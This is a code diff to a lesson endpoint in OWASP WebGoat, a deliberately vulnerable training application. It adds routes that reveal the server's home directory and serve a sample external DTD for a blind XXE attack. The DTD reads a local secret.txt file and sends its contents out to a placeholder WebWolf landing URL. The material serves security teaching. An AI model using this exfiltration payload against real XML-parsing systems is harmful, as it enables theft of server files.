@@ -29,13 +29,16 @@ import org.owasp.webgoat.assignments.AssignmentHints;
 import org.owasp.webgoat.assignments.AttackResult;
 import org.springframework.beans.factory.annotation.Autowired;
 import org.springframework.beans.factory.annotation.Value;
+import org.springframework.http.MediaType;
 import org.springframework.web.bind.annotation.PostMapping;
 import org.springframework.web.bind.annotation.RequestBody;
+import org.springframework.web.bind.annotation.RequestMapping;
 import org.springframework.web.bind.annotation.ResponseBody;
 import org.springframework.web.bind.annotation.RestController;
 
 import static org.springframework.http.MediaType.ALL_VALUE;
 import static org.springframework.http.MediaType.APPLICATION_JSON_VALUE;
+
 
 /**
  * @author nbaars
@@ -50,6 +53,11 @@ public class SimpleXXE extends AssignmentEndpoint {
 
     @Value("${webgoat.server.directory}")
     private String webGoatHomeDirectory;
+    
+    @Value("${webwolf.url.landingpage}")
+    private String webWolfURL;
+    
+    
     @Autowired
     private Comments comments;
 
@@ -77,4 +85,20 @@ public class SimpleXXE extends AssignmentEndpoint {
         }
         return success;
     }
+    
+    @RequestMapping(path="/xxe/tmpdir",consumes = ALL_VALUE, produces=MediaType.TEXT_PLAIN_VALUE)
+    @ResponseBody
+    public String getWebGoatHomeDirectory() {
+    	return webGoatHomeDirectory;
+    }
+    
+    @RequestMapping(path="/xxe/sampledtd",consumes = ALL_VALUE, produces=MediaType.TEXT_PLAIN_VALUE)
+    @ResponseBody
+    public String getSampleDTDFile() {
+    	return "<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n" + 
+    			"<!ENTITY % file SYSTEM \"file:replace-this-by-webgoat-temp-directory/XXE/secret.txt\">\n" + 
+    			"<!ENTITY % all \"<!ENTITY send SYSTEM 'http://replace-this-by-webwolf-base-url/landing?text=%file;'>\">\n" + 
+    			"%all;";
+    }
+    
 }
